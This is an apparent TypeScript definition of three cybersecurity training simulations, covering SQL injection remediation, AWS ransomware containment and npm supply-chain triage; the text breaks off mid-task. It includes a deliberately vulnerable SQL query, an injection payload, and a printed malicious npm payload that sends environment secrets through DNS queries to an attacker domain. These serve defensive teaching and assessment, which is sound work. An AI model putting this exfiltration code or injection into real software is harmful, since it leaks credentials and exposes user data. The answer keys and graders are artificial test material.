/**
 * SkillForge AI — Cyber Security (CYBER) Simulation Packages
 * Tracks: Fresher, Junior, Senior
 */

import { SimulationDefinition } from "@/types/simulation";

export const CYBER_FRESHER_SIMULATION: SimulationDefinition = {
  id: "SIM-CYB-FRE-001",
  version: "1.0.0",
  careerCode: "CYBER",
  level: "fresher",
  title: "OWASP Top 10 Audit & SQL Injection (SQLi) Vulnerability Remediation",
  status: "active",
  roleContext: {
    roleTitle: "Associate Security Analyst",
    team: "Application Security & Vulnerability Management",
    companyContext: "E-Commerce portal managing customer payment profiles and order histories.",
    reportingTo: "Application Security Lead",
  },
  scenario:
    "During an internal vulnerability assessment, an automated DAST scanner flagged a Critical severity SQL Injection vulnerability in the customer order search API endpoint (`GET /api/v1/orders/search?orderId=...`). Inspection of the microservice source code reveals that user input is concatenated directly into a raw SQL query string without sanitization or parameterized bindings. An attacker submitting `' OR '1'='1` can dump the entire customer database, bypassing tenant authentication. You must analyze the attack path, rewrite the vulnerable database query using prepared statements with parameterized inputs, and author a formal Vulnerability Remediation Advisory with a CVSS 3.1 severity rating.",
  businessContext:
    "If exploited by an external threat actor, this vulnerability exposes 850,000 customer records and PCI-DSS cardholder data, triggering mandatory reporting and potential regulatory fines exceeding ₹25,000,000.",
  objective:
    "Analyze the SQL injection attack vector, patch the vulnerable query with parameterized prepared statements, verify input sanitization, and author a CVSS security advisory.",
  estimatedMinutes: 45,
  difficulty: "Beginner",
  prerequisites: ["OWASP Top 10 concepts (A03:2021 Injection)", "SQL query fundamentals", "Parameterized queries / Prepared statements", "CVSS 3.1 scoring basics"],
  learningOutcomes: [
    "Identifying SQL injection attack surfaces in backend code",
    "Remediating injection vulnerabilities using parameterized statements",
    "Estimating CVSS 3.1 base severity metrics",
    "Authoring developer-facing security remediation advisories",
  ],
  skills: ["OWASP Top 10", "SQL Injection", "Secure Coding", "Prepared Statements", "CVSS Scoring"],
  materials: [
    {
      id: "mat-cyb-fre-1",
      title: "Vulnerable OrderService Source Code",
      type: "code",
      description: "Backend database query service containing raw string concatenation flaw.",
      filename: "OrderService.ts",
      relevance: "Used in Task 1 and Task 2 to diagnose and implement the prepared statement patch.",
      content: `import { Pool } from "pg";

export class OrderService {
  constructor(private db: Pool) {}

  // CRITICAL VULNERABILITY: Raw string concatenation permits SQL injection!
  async searchOrders(customerId: string, orderIdInput: string) {
    const rawQuery = "SELECT id, total_amount, shipping_address, card_last4 " +
      "FROM orders WHERE customer_id = '" + customerId + "' AND id = '" + orderIdInput + "'";
    
    // Attacker sends orderIdInput: "' OR '1'='1" -> dumps all tenant records!
    const result = await this.db.query(rawQuery);
    return result.rows;
  }
}`,
    },
    {
      id: "mat-cyb-fre-2",
      title: "DAST Scanner Exploitation Proof-of-Concept",
      type: "logs",
      description: "HTTP request and database query logs showing the injection exploit.",
      filename: "sql_injection_dast.log",
      relevance: "Used in Task 1 to analyze the payload execution and data leakage.",
      content: `[REQUEST] GET /api/v1/orders/search?orderId=%27%20OR%20%271%27=%271 HTTP/1.1
Host: api.skillforge-shop.internal
User-Agent: OWASP-ZAP-Scanner/2.14

[DATABASE EXECUTED]
SELECT id, total_amount, shipping_address, card_last4 FROM orders WHERE customer_id = 'CUST-849' AND id = '' OR '1'='1'
[RESPONSE STATUS] HTTP 200 OK (Payload returned 42,910 records across ALL customers!)`,
    },
  ],
  tasks: [
    {
      id: 1,
      title: "Deconstruct Attack Vector & Calculate CVSS 3.1 Score",
      type: "investigation",
      dimension: "Threat Identification & Triage",
      objective: "Explain the injection mechanism and calculate the CVSS 3.1 base score.",
      context: "Inspect sql_injection_dast.log and OrderService.ts.",
      prompt:
        "Analyze the vulnerability:\n1. Explain how the payload `' OR '1'='1` alters the SQL AST (Abstract Syntax Tree) to bypass the `customer_id = 'CUST-849'` tenant boundary.\n2. Calculate the CVSS 3.1 Base Score and provide the vector string (Attack Vector: Network, Attack Complexity: Low, Privileges Required: None/Low, User Interaction: None, Scope: Unchanged, Confidentiality: High, Integrity: None/Low, Availability: None).\n3. What is the resulting CVSS qualitative rating (Low, Medium, High, or Critical)?",
      constraints: ["Provide the complete CVSS 3.1 vector string and numeric score (~8.5-9.8)."],
      expectedOutput: "A structured attack breakdown and CVSS calculation.",
      acceptanceCriteria: [
        "Explains boolean logic tautology ('1'='1') and operator precedence overriding the customer_id filter",
        "Provides valid CVSS 3.1 vector string (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N or similar)",
        "Assigns CVSS score >= 7.5 (High or Critical)",
      ],
      skills: ["SQL Injection", "CVSS 3.1", "Threat Modeling"],
      evidenceRequired: ["AST alteration analysis", "CVSS 3.1 vector string and score"],
      validationRules: [
        { id: "cyb-fre-t1-rule1", description: "CVSS vector string", type: "code_static", expectedSnippet: "CVSS:3.1" },
        { id: "cyb-fre-t1-rule2", description: "Operator precedence explanation", type: "document_structure", expectedSnippet: "tautology" },
      ],
      rubricWeight: 30,
      hints: ["The OR operator has lower precedence than AND in standard SQL, meaning `WHERE (A AND B) OR True` evaluates to True for every row in the table."],
      timeEstimateMins: 12,
    },
    {
      id: 2,
      title: "Implement Parameterized Prepared Statement Patch",
      type: "implementation",
      dimension: "Remediation & Patch Soundness",
      objective: "Refactor OrderService.ts using parameterized queries ($1, $2).",
      context: "Eliminate string concatenation using pg library parameterized arrays.",
      prompt:
        "Provide your patched OrderService.ts implementation:\n1. Replace string concatenation with parameterized SQL placeholders (`$1`, `$2`).\n2. Pass `[customerId, orderIdInput]` in the query values array.\n3. Add input validation regex ensuring `orderIdInput` matches alphanumeric format (e.g. `ORD-[A-Za-z0-9]+`) before invoking the database.\n4. Show how malicious inputs like `' OR '1'='1` are treated safely as literal text rather than executable SQL.",
      constraints: ["Must use parameterized binding syntax ($1, $2) and input validation."],
      expectedOutput: "Production-ready, patched TypeScript OrderService class.",
      acceptanceCriteria: [
        "Replaces string interpolation with parameterized SQL ($1, $2)",
        "Passes query values as separate array parameters to db.query",
        "Includes defensive input format validation",
      ],
      skills: ["Secure Coding", "Prepared Statements", "PostgreSQL", "TypeScript"],
      evidenceRequired: ["Patched OrderService.ts source code", "Literal string binding explanation"],
      validationRules: [
        { id: "cyb-fre-t2-rule1", description: "Parameterized $1 syntax", type: "code_static", expectedSnippet: "$1" },
        { id: "cyb-fre-t2-rule2", description: "Query values array", type: "code_static", expectedSnippet: "[customerId" },
      ],
      rubricWeight: 45,
      hints: ["With prepared statements, the database engine compiles the SQL structure first, treating parameter values strictly as literal data."],
      timeEstimateMins: 20,
    },
    {
      id: 3,
      title: "Security Advisory & Static Analysis (SAST) Rule",
      type: "communication",
      dimension: "Incident Reporting & Advisory",
      objective: "Draft an internal Security Advisory and propose a Semgrep / ESLint rule to prevent future regressions.",
      context: "Educate engineering teams and implement automated CI/CD guardrails.",
      prompt:
        "Author a Security Advisory document:\n1. Executive Summary & Impact.\n2. Remediation Guidelines for Developers.\n3. Write a Semgrep rule or ESLint security plugin rule (`no-unsafe-query-concat`) that detects string concatenation inside `.query(...)` calls during CI/CD builds.",
      constraints: ["Include explicit Semgrep rule YAML or linter configuration."],
      expectedOutput: "Markdown Security Advisory with code example and Semgrep rule.",
      acceptanceCriteria: [
        "Comprehensive security advisory with clear risk description",
        "Actionable secure coding guidance for backend developers",
        "Includes Semgrep YAML pattern matching string concatenation in database queries",
      ],
      skills: ["Security Advisory", "SAST (Semgrep)", "DevSecOps"],
      evidenceRequired: ["Security Advisory document", "Semgrep YAML rule"],
      validationRules: [
        { id: "cyb-fre-t3-rule1", description: "Semgrep rule pattern", type: "code_static", expectedSnippet: "pattern" },
        { id: "cyb-fre-t3-rule2", description: "Advisory structure", type: "document_structure", requiredSections: ["Summary", "Remediation", "CI/CD"], minWordCount: 40 },
      ],
      rubricWeight: 25,
      hints: ["A Semgrep pattern like `$DB.query(\"...\" + ...)` catches raw string concatenation before code reaches production."],
      timeEstimateMins: 13,
    },
  ],
  deliverable: {
    type: "Incident Triage Report (PDF) + Security Remediation Patch",
    description: "Submit patched OrderService.ts and formal Security Advisory report.",
    fields: [
      { name: "repoUrl", label: "GitHub Patch / Advisory URL", type: "url", placeholder: "https://github.com/candidate/sqli-remediation-patch", required: true, helpText: "Repository containing patched OrderService.ts and Semgrep rules." },
      { name: "notes", label: "Security Advisory & CVSS 3.1 Report", type: "text", placeholder: "Paste your CVSS calculation, attack path analysis, and developer advisory...", required: true, helpText: "Include your CVSS vector string and Semgrep configuration." },
    ],
    validationRules: [
      { id: "deliv-cyb-fre-1", description: "URL format", type: "code_static", expectedSnippet: "http" },
    ],
  },
  rubric: [
    { id: "remediation_quality", name: "Remediation & Prepared Statements", weight: 35, description: "Technical correctness of prepared statement parameters and elimination of string concatenation.", criteria: ["Proper parameterized bindings ($1, $2)", "Input format validation", "Elimination of injection surface"] },
    { id: "threat_identification", name: "Threat Identification & CVSS 3.1", weight: 35, description: "Rigor of AST alteration analysis and accuracy of CVSS 3.1 scoring.", criteria: ["Correct AST logic analysis", "Valid CVSS vector string", "Accurate qualitative severity"] },
    { id: "incident_reporting", name: "Security Advisory & SAST Guardrails", weight: 30, description: "Clarity of developer advisory and effectiveness of Semgrep automated detection rule.", criteria: ["Actionable developer guidance", "Functional Semgrep rule pattern"] },
  ],
  hints: ["Never sanitize SQL injection with regex replacement alone; parameterized prepared statements are the only 100% defense."],
  progression: {
    onSuccess: {
      recommendedTrack: "CYBER",
      recommendedLevel: "junior",
      rationale: "Candidate demonstrated excellent vulnerability triage and secure coding. Advance to Junior: Live Cloud VPC Ransomware Containment & Forensics.",
    },
    onRemediation: {
      recommendedTrack: "CYBER",
      recommendedLevel: "fresher",
      targetSkill: "Prepared Statements & Injection Defense",
      rationale: "Review SQL parameterization and AST query compilation before investigating live intrusion incidents.",
    },
  },
};

export const CYBER_JUNIOR_SIMULATION: SimulationDefinition = {
  id: "SIM-CYB-JUN-001",
  version: "1.0.0",
  careerCode: "CYBER",
  level: "junior",
  title: "Live Cloud VPC Ransomware Containment & Incident Response Forensics",
  status: "active",
  roleContext: {
    roleTitle: "Cloud Incident Response & SOC Analyst",
    team: "Security Operations Center (SOC) & Incident Response",
    companyContext: "Healthcare SaaS handling HIPAA-compliant patient medical records across AWS infrastructure.",
    reportingTo: "CISO & Lead Incident Commander",
  },
  scenario:
    "At 02:14 UTC, SIEM alerts fired indicating unauthorized lateral movement across the production AWS VPC. An adversary compromised an engineer's AWS IAM Access Key leaked on an external forum, obtained initial access to a staging bastion host, escalated privileges via an unpatched kernel exploit (Dirty Pipe), and is actively attempting to deploy ransomware across production PostgreSQL database replicas. Snort IDS has flagged outbound beaconing to a known C2 (Command & Control) IP address in Eastern Europe. You must reconstruct the forensic intrusion timeline, execute an emergency containment runbook (isolating compromised EC2 instances, revoking IAM credentials, locking security groups), preserve forensic disk artifacts, and author an executive incident report.",
  businessContext:
    "Patient medical records are under active threat of extortion. A breach of this magnitude requires immediate declaration under HIPAA Breach Notification Rules if containment exceeds 60 minutes.",
  objective:
    "Analyze SIEM and VPC flow logs, reconstruct the adversary attack timeline, execute immediate network and credential containment, preserve forensic evidence, and draft a C-suite incident response report.",
  estimatedMinutes: 60,
  difficulty: "Intermediate",
  prerequisites: ["AWS IAM & Security Groups", "Linux command-line forensics (auth.log, auditd, netstat)", "Network flow log analysis", "NIST SP 800-61 Incident Handling Guide"],
  learningOutcomes: [
    "Reconstructing adversary lateral movement from VPC flow logs and SIEM telemetry",
    "Rapid containment: IAM session invalidation and network isolation",
    "Evidence preservation without contaminating volatility",
    "NIST 800-61 compliant incident report authoring",
  ],
  skills: ["Incident Response", "VPC Flow Logs", "SIEM Telemetry", "AWS IAM Containment", "Forensics"],
  materials: [
    {
      id: "mat-cyb-jun-1",
      title: "SIEM Splunk Alert Timeline & VPC Flow Logs",
      type: "logs",
      description: "Aggregated alerts from AWS GuardDuty, CloudTrail, and VPC Flow Logs.",
      filename: "siem_incident_timeline.log",
      relevance: "Used in Task 1 to trace the adversary's entry point and lateral movement.",
      content: `02:14:02 UTC [CloudTrail] ConsoleLogin: User 'dev-lead-rahul' logged in from unauthorized IP 185.220.101.42 (Tor Exit Node) using leaked IAM access key AKIAIOSFODNN7EXAMPLE
02:16:44 UTC [GuardDuty] UnauthorizedAccess:EC2/SSHBruteForce: Bastion host i-084f92bc31 initiated internal SSH sweep across 10.0.2.0/24 subnet
02:18:12 UTC [Linux auth.log (Bastion)] sudo: user 'ubuntu' : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.dirtypipe_exploit
02:21:05 UTC [VPC Flow Log] ACCEPT 10.0.1.15 (Bastion) -> 10.0.2.88 (Prod-DB-Replica) PORT 5432 PROTO 6 PACKETS 1420 BYTES 892000
02:24:19 UTC [Snort IDS] ALERT: Outbound beaconing detected from 10.0.2.88 to 194.26.29.112:8443 (Known LockBit C2 Server!)`,
    },
    {
      id: "mat-cyb-jun-2",
      title: "Production VPC Architecture & Security Group Rules",
      type: "config",
      description: "AWS Security Group configuration for Bastion and Database tiers.",
      filename: "vpc_security_groups.json",
      relevance: "Used in Task 2 to design the emergency isolation rules.",
      content: `{
  "security_groups": {
    "sg-bastion": { "ingress": [{ "cidr": "0.0.0.0/0", "port": 22 }], "egress": [{ "cidr": "10.0.0.0/16", "port": "ALL" }] },
    "sg-database": { "ingress": [{ "source": "sg-bastion", "port": 5432 }], "egress": [{ "cidr": "0.0.0.0/0", "port": "ALL" }] }
  }
}`,
    },
  ],
  tasks: [
    {
      id: 1,
      title: "Adversary Attack Path & Forensic Timeline Reconstruction",
      type: "investigation",
      dimension: "Forensic Analysis & Traceability",
      objective: "Reconstruct the chronological timeline from initial access to C2 beaconing.",
      context: "Analyze siem_incident_timeline.log in Materials.",
      prompt:
        "Reconstruct the intrusion timeline:\n1. Initial Access: Identify the compromised IAM credential, unauthorized source IP, and entry point.\n2. Privilege Escalation: Pinpoint the exploit executed on the bastion host and privileges attained.\n3. Lateral Movement: Trace the internal network path from the bastion to the database replica.\n4. Exfiltration / C2: Identify the external Command & Control IP address and destination port.",
      constraints: ["Cite exact timestamps, IP addresses, and AWS resource IDs from the logs."],
      expectedOutput: "A structured 4-step chronological attack reconstruction.",
      acceptanceCriteria: [
        "Identifies 'dev-lead-rahul' IAM key accessed via Tor IP 185.220.101.42 at 02:14 UTC",
        "Documents Dirty Pipe privilege escalation to root on bastion i-084f92bc31 at 02:18 UTC",
        "Traces lateral SSH/DB movement to Prod-DB-Replica (10.0.2.88) at 02:21 UTC",
        "Identifies LockBit C2 beaconing to 194.26.29.112:8443 at 02:24 UTC",
      ],
      skills: ["Forensic Timeline", "CloudTrail Analysis", "MITRE ATT&CK", "Intrusion Analysis"],
      evidenceRequired: ["Exact timeline with timestamps and MITRE tactics"],
      validationRules: [
        { id: "cyb-jun-t1-rule1", description: "C2 IP address citation", type: "code_static", expectedSnippet: "194.26.29.112" },
        { id: "cyb-jun-t1-rule2", description: "Compromised IAM key identification", type: "code_static", expectedSnippet: "dev-lead-rahul" },
      ],
      rubricWeight: 35,
      hints: ["Map each step to MITRE ATT&CK: T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation), T1021 (Remote Services), T1071 (C2)."],
      timeEstimateMins: 20,
    },
    {
      id: 2,
      title: "Emergency Containment Playbook & Network Isolation",
      type: "implementation",
      dimension: "Remediation & Patch Soundness",
      objective: "Formulate and execute immediate AWS containment actions to stop ransomware spread.",
      context: "Apply NIST 800-61 containment strategies across AWS IAM and VPC Security Groups.",
      prompt:
        "Provide the exact emergency containment sequence:\n1. IAM Containment: AWS CLI commands to deactivate access key AKIAIOSFODNN7EXAMPLE and revoke active session tokens for dev-lead-rahul.\n2. Network Isolation: Modify security groups sg-bastion and sg-database to immediately sever all outbound internet traffic and internal lateral connections while preserving forensic SSH access from a trusted SOC IP.\n3. Evidence Preservation: Specify how to take an EBS snapshot of i-084f92bc31 and dump RAM volatility before rebooting or terminating the instance.",
      constraints: ["Must explicitly forbid terminating the EC2 instances before forensic RAM/EBS snapshots are captured."],
      expectedOutput: "Step-by-step CLI containment playbook with AWS commands and security group rules.",
      acceptanceCriteria: [
        "Provides AWS CLI commands to deactivate IAM key and attach explicit DenyAll policy",
        "Updates security groups to cut off C2 egress and internal lateral movement",
        "Mandates memory dump and EBS snapshot preservation before instance isolation",
      ],
      skills: ["AWS Incident Containment", "Security Group Hardening", "Digital Forensics (RAM/Disk)"],
      evidenceRequired: ["AWS CLI containment commands", "Forensic preservation steps"],
      validationRules: [
        { id: "cyb-jun-t2-rule1", description: "AWS IAM deactivate command", type: "code_static", expectedSnippet: "update-access-key" },
        { id: "cyb-jun-t2-rule2", description: "EBS snapshot preservation", type: "code_static", expectedSnippet: "snapshot" },
      ],
      rubricWeight: 40,
      hints: ["Do NOT shut down the instance immediately! Volatile RAM artifacts containing C2 encryption keys are lost if powered down."],
      timeEstimateMins: 24,
    },
    {
      id: 3,
      title: "Executive Incident Report & HIPAA Breach Assessment",
      type: "communication",
      dimension: "Incident Reporting & Advisory",
      objective: "Author an executive incident summary for the CISO and General Counsel.",
      context: "Prepare a formal report under HIPAA Breach Notification guidelines.",
      prompt:
        "Write an Executive Incident Response Report:\n1. Incident Overview & Severity Classification (P1 - Critical).\n2. Root Cause & Threat Actor Profile.\n3. Containment Status & Data Exfiltration Assessment (Did patient PHI leave the perimeter?).\n4. Three Long-Term Preventative Controls (Mandatory MFA with FIDO2 hardware keys, AWS GuardDuty auto-remediation Lambdas, VPC zero-trust egress proxies).",
      constraints: ["Format with formal executive headings."],
      expectedOutput: "A structured executive incident report suitable for legal counsel and executive leadership.",
      acceptanceCriteria: [
        "Clearly summarizes containment timeline and exfiltration risk",
        "Provides legal counsel with HIPAA breach exposure assessment",
        "Proposes concrete systemic security controls (Hardware MFA, egress filtering)",
      ],
      skills: ["Executive Incident Reporting", "Regulatory Compliance (HIPAA)", "Security Controls"],
      evidenceRequired: ["Executive Incident Report Markdown"],
      validationRules: [
        { id: "cyb-jun-t3-rule1", description: "HIPAA assessment", type: "document_structure", expectedSnippet: "HIPAA" },
        { id: "cyb-jun-t3-rule2", description: "Report structure", type: "document_structure", requiredSections: ["Overview", "Root Cause", "Containment", "Controls"], minWordCount: 50 },
      ],
      rubricWeight: 25,
      hints: ["Under HIPAA, an acquisition or access of unencrypted PHI is presumed to be a breach unless a low probability of compromise is demonstrated."],
      timeEstimateMins: 16,
    },
  ],
  deliverable: {
    type: "Incident Triage Report (PDF) + Security Remediation Patch",
    description: "Submit comprehensive Incident Response Report and AWS containment automation scripts.",
    fields: [
      { name: "repoUrl", label: "Playbook / Report Repo URL", type: "url", placeholder: "https://github.com/candidate/incident-containment-playbook", required: true, helpText: "Repository containing containment scripts and incident report." },
      { name: "notes", label: "Incident Timeline & Containment Summary", type: "text", placeholder: "Paste your attack timeline, AWS containment CLI commands, and HIPAA assessment...", required: true, helpText: "Include your C2 IP addresses, AWS security group changes, and executive summary." },
    ],
    validationRules: [
      { id: "deliv-cyb-jun-1", description: "URL format", type: "code_static", expectedSnippet: "http" },
    ],
  },
  rubric: [
    { id: "threat_identification", name: "Forensic Analysis & Attack Reconstruction", weight: 35, description: "Chronological accuracy of MITRE attack path reconstruction and identification of all compromised assets.", criteria: ["Accurate identification of initial access", "Correct C2 IP and lateral movement tracing", "Correlation across CloudTrail, GuardDuty, and auth.log"] },
    { id: "remediation_quality", name: "Containment Quality & Evidence Preservation", weight: 35, description: "Speed and correctness of IAM credential deactivation, security group isolation, and RAM preservation.", criteria: ["Correct AWS CLI containment syntax", "Rapid network isolation", "Zero evidence destruction (EBS/RAM preserved)"] },
    { id: "incident_reporting", name: "Executive & Regulatory Incident Reporting", weight: 30, description: "Professionalism of executive briefing and accuracy of HIPAA breach notification risk assessment.", criteria: ["Clear C-suite communication", "Defensible regulatory exposure assessment", "Robust preventative controls"] },
  ],
  hints: ["Ensure that you deauthorize all active STS session tokens, not just the static IAM access key."],
  progression: {
    onSuccess: {
      recommendedTrack: "CYBER",
      recommendedLevel: "senior",
      rationale: "Candidate demonstrated excellent incident response and forensic acumen. Advance to Senior: Zero-Trust Architecture & Supply Chain Triage.",
    },
    onRemediation: {
      recommendedTrack: "CYBER",
      recommendedLevel: "junior",
      targetSkill: "Incident Containment & AWS Forensics",
      rationale: "Review AWS IAM session invalidation and volatility preservation before managing enterprise zero-trust architectures.",
    },
  },
};

export const CYBER_SENIOR_SIMULATION: SimulationDefinition = {
  id: "SIM-CYB-SEN-001",
  version: "1.0.0",
  careerCode: "CYBER",
  level: "senior",
  title: "Zero-Trust Architecture & Compromised npm Supply Chain Attack Triage",
  status: "active",
  roleContext: {
    roleTitle: "Chief Information Security Architect / Principal SecOps Engineer",
    team: "Enterprise Cybersecurity Architecture & Threat Intel",
    companyContext: "Global banking infrastructure providing core payment processing for 120 regional banks.",
    reportingTo: "Chief Information Security Officer (CISO)",
  },
  scenario:
    "A popular third-party open-source npm library (`crypto-token-utils`) used in our core payment microservices was compromised via a maintainer account takeover (Supply Chain Attack v3.2.1). The malicious package contains an obfuscated payload that detects production environments, hooks into crypto signing functions, and exfiltrates unencrypted JWT private keys and database credentials via DNS tunneling and steganographic HTTPS beacons to an external domain. Perimeter firewalls failed to alert because egress traffic was disguised as legitimate DNS queries. You must reverse engineer the malicious dependency payload, analyze the DNS exfiltration channel, architect an enterprise-wide Zero-Trust egress security perimeter (mutual TLS, strict DNS sinkholing, SPIFFE/SPIRE workload identity), and establish automated software supply chain provenance verification (SLSA Level 3, Sigstore, Cosign).",
  businessContext:
    "Private cryptographic signing keys were potentially exfiltrated, endangering ₹500,000,000 in daily interbank settlements. Central bank regulators require an immediate Zero-Trust architecture overhaul.",
  objective:
    "Reverse engineer the malicious supply chain payload, analyze DNS tunneling exfiltration telemetry, design an enterprise Zero-Trust egress security perimeter, and establish SLSA Level 3 supply chain provenance verification.",
  estimatedMinutes: 90,
  difficulty: "Advanced",
  prerequisites: ["Software Supply Chain Security (SLSA, Sigstore/Cosign, SBOM)", "Zero-Trust Architecture (NIST SP 800-207)", "DNS Tunneling & C2 Exfiltration Analysis", "Mutual TLS & SPIFFE/SPIRE Workload Identity"],
  learningOutcomes: [
    "De-obfuscating and analyzing malicious npm dependency payloads",
    "Detecting covert DNS tunneling and egress exfiltration channels",
    "Architecting micro-segmented Zero-Trust egress proxies with mTLS",
    "Implementing SLSA Level 3 build provenance and automated SBOM gating in CI/CD",
  ],
  skills: ["Zero-Trust Architecture", "Supply Chain Security (SLSA)", "Reverse Engineering", "DNS Tunneling", "SPIFFE/SPIRE", "mTLS"],
  materials: [
    {
      id: "mat-cyb-sen-1",
      title: "Malicious npm Dependency Code Snippet (crypto-token-utils v3.2.1)",
      type: "code",
      description: "De-obfuscated JavaScript payload extracted from node_modules.",
      filename: "compromised_payload_snippet.js",
      relevance: "Used in Task 1 to analyze the credential harvesting and exfiltration mechanism.",
      content: `// De-obfuscated extract from crypto-token-utils/lib/signer.js
const dns = require('dns');

function harvestAndExfiltrate() {
  const envKeys = JSON.stringify(process.env).replace(/[^a-zA-Z0-9]/g, '');
  // Base32 chunks encoded into DNS subdomain queries
  const chunks = envKeys.match(/.{1,30}/g) || [];
  
  chunks.forEach((chunk, idx) => {
    // DNS Tunneling: Exfiltrates secrets via DNS query to attacker authoritative nameserver!
    dns.resolve4(\`\${idx}.\${chunk}.c2-analytics-telemetry.org\`, (err) => {
      // Ignores DNS resolution error; exfiltration already succeeded at upstream nameserver!
    });
  });
}

if (process.env.NODE_ENV === 'production' && !process.env.CI) {
  setTimeout(harvestAndExfiltrate, 5000);
}`,
    },
    {
      id: "mat-cyb-sen-2",
      title: "Internal DNS Query Server Telemetry",
      type: "logs",
      description: "CoreDNS telemetry logs showing high-frequency base32 subdomain queries.",
      filename: "coredns_anomaly.log",
      relevance: "Used in Task 1 to calculate the volume and extent of exfiltrated secrets.",
      content: `[DNS QUERY] 03:11:02 10.0.4.18 -> 10.0.0.2:53 IN A 0.eyJKV1RfUFJJVkFURV9LRVkiOiJt.c2-analytics-telemetry.org (28 bytes)
[DNS QUERY] 03:11:03 10.0.4.18 -> 10.0.0.2:53 IN A 1.SUlFc0FJQkFBS0NBZ1VBN0xpT1dD.c2-analytics-telemetry.org (28 bytes)
[DNS QUERY] 03:11:04 10.0.4.18 -> 10.0.0.2:53 IN A 2.d2J3b1J6S0hQVG11V1pxWkVBNmtx.c2-analytics-telemetry.org (28 bytes)
[STAT] Query Volume to domain 'c2-analytics-telemetry.org': 420 queries in 60 seconds (Entropy: 4.88 bits/char - High Entropy Exfiltration!)`,
    },
    {
      id: "mat-cyb-sen-3",
      title: "NIST SP 800-207 Zero-Trust Architecture Framework",
      type: "docs",
      description: "Architecture principles for enterprise zero-trust segmentation and workload identity.",
      filename: "NIST_800_207_Summary.md",
      relevance: "Used in Task 2 to design the Zero-Trust micro-segmentation boundaries.",
      content: `## NIST 800-207 Core Tenets
1. All resource communication is secured regardless of network location; perimeter defense is assumed breached.
2. Access is granted on a per-session basis with dynamic policy evaluation (Identity, Device, Context).
3. Workloads must have cryptographic identity (e.g. SPIFFE SVID) rather than trusting static IP addresses.
4. Egress traffic must be filtered via explicit allowlist proxies with TLS termination and DNS sinkholing.`,
    },
  ],
  tasks: [
    {
      id: 1,
      title: "Reverse Engineer Payload & Analyze DNS Tunneling Exfiltration",
      type: "investigation",
      dimension: "Forensic Analysis & Traceability",
      objective: "Dissect the compromised JavaScript payload and decode the exfiltrated credentials from DNS logs.",
      context: "Examine compromised_payload_snippet.js and coredns_anomaly.log.",
      prompt:
        "Analyze the exfiltration mechanics:\n1. Deconstruct how the payload abuses `dns.resolve4` to bypass perimeter firewalls that block outbound HTTP/HTTPS.\n2. Decode the sample chunks in coredns_anomaly.log (Base64/Base32 decode `eyJKV1RfUFJJVkFURV...`) and identify what specific secret was exfiltrated.\n3. Explain how high-entropy DNS request monitoring and response rate limiting detects covert channels.",
      constraints: ["Decode the sample DNS subdomain string and state the exposed environment variable."],
      expectedOutput: "A forensic analysis showing decoded secrets and DNS tunneling mechanics.",
      acceptanceCriteria: [
        "Explains that DNS queries carry data in the hostname to attacker-controlled authoritative nameservers",
        "Decodes snippet to reveal `JWT_PRIVATE_KEY`",
        "Articulates entropy analysis (> 4.5 bits/char) as an effective anomaly detection heuristic for DNS tunneling",
      ],
      skills: ["Reverse Engineering", "DNS Tunneling", "Threat Hunting", "Cryptographic Forensics"],
      evidenceRequired: ["Decoded secret name", "DNS exfiltration breakdown"],
      validationRules: [
        { id: "cyb-sen-t1-rule1", description: "Decoded secret identification", type: "code_static", expectedSnippet: "JWT_PRIVATE_KEY" },
        { id: "cyb-sen-t1-rule2", description: "DNS tunneling explanation", type: "code_static", expectedSnippet: "authoritative" },
      ],
      rubricWeight: 30,
      hints: ["The string `eyJKV1Rf...` is the base64 encoding of `{\"JWT_PRIVATE_KEY\":\"...`."],
      timeEstimateMins: 25,
    },
    {
      id: 2,
      title: "Architect Zero-Trust Egress Filtering & Workload Identity (SPIFFE/SPIRE)",
      type: "architecture",
      dimension: "Defense in Depth & Zero-Trust",
      objective: "Design a zero-trust network egress architecture that renders covert DNS exfiltration impossible.",
      context: "Apply NIST SP 800-207 principles to eliminate implicit egress trust.",
      prompt:
        "Architect the Zero-Trust egress security perimeter:\n1. Workload Identity (SPIFFE/SPIRE): How will payment microservices authenticate to egress proxies using short-lived cryptographically signed x509 SVIDs instead of static IP allowlists?\n2. Egress Filtering & DNS Sinkholing: Design a default-deny egress proxy (Envoy / Cilium Service Mesh) that terminates TLS and restricts external traffic strictly to verified payment gateway endpoints.\n3. DNS Lockdown: Restrict all pods from directly resolving external DNS; enforce internal CoreDNS forwarders with DNS RPZ (Response Policy Zones) and entropy anomaly blocking.",
      constraints: ["Address SPIFFE/SPIRE workload identity and default-deny egress architecture."],
      expectedOutput: "An enterprise Zero-Trust architecture specification with network diagram description.",
      acceptanceCriteria: [
        "Specifies SPIFFE/SPIRE issuance of ephemeral SVID certificates for workload-to-proxy authentication",
        "Designs Envoy/Cilium default-deny egress proxy enforcing FQDN allowlists with SNI inspection",
        "Enforces internal-only DNS resolution and DNS firewall sinkholing (RPZ)",
      ],
      skills: ["Zero-Trust Architecture", "SPIFFE/SPIRE", "Service Mesh (Envoy/Cilium)", "mTLS", "Egress Filtering"],
      evidenceRequired: ["Zero-Trust egress architecture design", "SPIFFE SVID integration spec"],
      validationRules: [
        { id: "cyb-sen-t2-rule1", description: "SPIFFE or SPIRE workload identity", type: "code_static", expectedSnippet: "SPIFFE" },
        { id: "cyb-sen-t2-rule2", description: "Default-deny egress policy", type: "code_static", expectedSnippet: "default-deny" },
      ],
      rubricWeight: 40,
      hints: ["In a Zero-Trust Kubernetes cluster, pods should NEVER have direct internet access; all external calls must pass through an egress proxy requiring mTLS."],
      timeEstimateMins: 35,
    },
    {
      id: 3,
      title: "Supply Chain Provenance Verification (SLSA Level 3 & Sigstore)",
      type: "implementation",
      dimension: "Remediation & Patch Soundness",
      objective: "Establish CI/CD build provenance and SBOM verification to prevent compromised packages from deploying.",
      context: "Build automated security gates using Sigstore Cosign and in-toto attestations.",
      prompt:
        "Formulate the Software Supply Chain Defense strategy:\n1. SLSA Level 3 Compliance: Outline the automated build pipeline requirements (isolated build environments, tamper-evident build provenance attestations).\n2. Sigstore / Cosign Verification: Write the GitHub Actions workflow snippet verifying that third-party container images and dependencies have cryptographically signed provenance before deployment.\n3. Dynamic SBOM Scanning: Implement automated Software Bill of Materials (SBOM) generation (CycloneDX / Syft) and vulnerability gating in CI/CD.",
      constraints: ["Include explicit Cosign verification CLI or GitHub Actions YAML."],
      expectedOutput: "Supply chain security specification with CI/CD Cosign verification workflow.",
      acceptanceCriteria: [
